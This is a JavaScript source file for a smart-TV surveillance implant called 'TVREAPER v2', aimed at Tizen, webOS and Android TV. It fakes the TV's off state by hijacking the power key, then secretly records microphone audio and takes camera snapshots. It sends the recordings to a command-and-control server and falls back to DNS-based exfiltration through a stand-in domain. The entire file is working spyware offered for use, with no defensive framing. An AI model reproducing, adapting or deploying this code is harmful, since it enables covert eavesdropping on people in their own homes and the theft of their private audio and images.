/**
 * TVREAPER v2 — one TV-resident implant, all JS/Android families.
 * NEW in v2: Android-TV/BRAVIA/FireTV getUserMedia support (mic+cam),
 * Philips NetTV page-mode, screen-state events on Android.
 */
(function () {
  const CONFIG = {
    c2Base: "https://C4-FORGE-HOST:7443",
    clipMs: 5 * 60 * 1000,
    vadEnergyFloor: 0.02,
    fakeOff: { active: false, lastUserActivity: Date.now() },
    // v2: Android-TV screen-off listening:
    onScreenOffCapture: true
  };
  let mediaStream = null;
  function log(...a) { try { console.log("[TVREAPER]", ...a); } catch (e) {} }
  const isTizen   = typeof tizen !== "undefined";
  const isWebOS   = typeof webOS !== "undefined" && webOS.platform;
  const isAndroid = typeof AndroidTV !== "undefined" || navigator.userAgent.includes("Android");

  // ---------- power/fake-off ----------
  function enterFakeOff() {
    CONFIG.fakeOff.active = true;
    if (isTizen) try { tizen.power.request("SCREEN","SCREEN_OFF");
                          tizen.power.request("CPU","CPU_AWAKE"); } catch(e){}
    if (isWebOS) try { webOS.platform.tv.setWindowAutoDimEnabled(false); } catch(e){}
    if (isAndroid) try { AndroidTV.screenOff(); } catch(e){}  // vendor shim
    document.documentElement.style.visibility = "hidden";
  }
  function exitFakeOff() {
    CONFIG.fakeOff.active = false;
    if (isTizen) try { tizen.power.release("CPU"); } catch(e){}
    document.documentElement.style.visibility = "visible";
  }
  function bindPowerKey() {
    document.addEventListener("keydown", e => {
      if ([10250, 4128].includes(e.keyCode) || e.key === "PowerOff") {
        if (CONFIG.fakeOff.active) { exitFakeOff(); return; }
        if (Date.now() - CONFIG.fakeOff.lastUserActivity > 30*60*1000) {
          e.preventDefault(); enterFakeOff();
        }
      }
    });
  }
  setInterval(() => CONFIG.fakeOff.lastUserActivity = Date.now(), 5000);

  // Android-TV native screen-off events (v2): capture when screen goes
  // dark — no key interdiction needed; the OS tells us.
  if (isAndroid) {
    try {
      AndroidTV.onScreenOff(() => {
        if (CONFIG.onScreenOffCapture) {
          enterFakeOff();  // keep capturing through screen-off
        }
      });
    } catch (e) {}
  }

  // ---------- mic capture (all JS families) ----------
  async function captureClip() {
    try {
      if (!mediaStream)
        mediaStream = await navigator.mediaDevices.getUserMedia({audio:true});
      const ctx = new (window.AudioContext||window.webkitAudioContext)();
      const src = ctx.createMediaStreamSource(mediaStream);
      const proc = ctx.createScriptProcessor(4096,1,1);
      let ring = []; let talking=false, lastLoud=0;
      proc.onaudioprocess = ev => {
        const buf = ev.inputBuffer.getChannelData(0);
        let e=0; for (let i=0;i<buf.length;i++) e += buf[i]*buf[i];
        e = Math.sqrt(e/buf.length);
        if (e > CONFIG.vadEnergyFloor) { talking=true; lastLoud=Date.now(); }
        if (talking || Date.now()-lastLoud < 1500) ring.push(new Float32Array(buf));
      };
      src.connect(proc);
      await new Promise(r => setTimeout(r, CONFIG.clipMs));
      src.disconnect();
      if (ring.length > 100) exfil(Date.now()+".wav", encodeWav(ring), "audio");
    } catch (e) { log("mic fail:", e); }
  }
  function encodeWav(frames) {
    const n = frames.reduce((s,f)=>s+f.length,0);
    const buf = new ArrayBuffer(44 + n*2), v = new DataView(buf);
    const w=(o,s)=>{for(let i=0;i<s.length;i++)v.setUint8(o+i,s.charCodeAt(i));};
    w(0,"RIFF"); v.setUint32(4,36+n*2,true); w(8,"WAVE"); w(12,"fmt ");
    v.setUint32(16,16,true); v.setUint16(20,1,true); v.setUint16(22,1,true);
    v.setUint32(24,16000,true); v.setUint32(28,32000,true);
    v.setUint16(32,2,true); v.setUint16(34,16,true); w(36,"data");
    v.setUint32(40,n*2,true);
    let off=44;
    for (const f of frames) for (let k=0;k<f.length;k++,off+=2) {
      const s=Math.max(-1,Math.min(1,f[k]));
      v.setInt16(off, s<0?s*0x8000:s*0x7FFF, true);
    }
    return new Blob([buf],{type:"audio/wav"});
  }

  // ---------- camera snapshot (Tizen/webOS/Android subsets) ----------
  async function snapshot() {
    try {
      const s = await navigator.mediaDevices.getUserMedia({video:true});
      const v = document.createElement("video");
      v.src = URL.createObjectURL(s); await v.play();
      const c = document.createElement("canvas");
      c.width=1280;c.height=720;
      c.getContext("2d").drawImage(v,0,0,c.width,c.height);
      c.toBlob(b => exfil(Date.now()+".jpeg", b, "video"), "image/jpeg", 0.85);
      s.getTracks().forEach(t=>t.stop());
    } catch (e) { log("cam fail:", e); }
  }

  // ---------- exfil ----------
  async function exfil(name, blob, kind) {
    try {
      const r = await fetch(CONFIG.c2Base+"/tv/"+encodeURIComponent(name)+
                            "?kind="+kind, {method:"POST", body: blob});
      if (r.ok) return;
    } catch (e) {}
    dnsExfil(blob);
  }
  function dnsExfil(blob) {
    blob.arrayBuffer().then(ab => {
      const enc = b32encode(new Uint8Array(ab.slice(0,200)));
      new Image().src = "http://"+enc+".tv.forge-c2.example/pixel.gif";
    });
  }
  function b32encode(bytes) {
    const A="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"; let bits=0,val=0,out="";
    for (const b of bytes){ val=(val<<8)|b; bits+=8;
      while(bits>=5){out+=A[(val>>>(bits-5))&31];bits-=5;} }
    if(bits>0)out+=A[(val<<(5-bits))&31];
    return out;
  }

  // ---------- boot ----------
  bindPowerKey();
  setInterval(() => { if (CONFIG.fakeOff.active) captureClip(); },
             61*1000 + Math.random()*1000);
  setInterval(async () => {
    if (CONFIG.fakeOff.active && Math.random()<0.1) await snapshot();
  }, 17*60*1000 + Math.random()*4000);
})();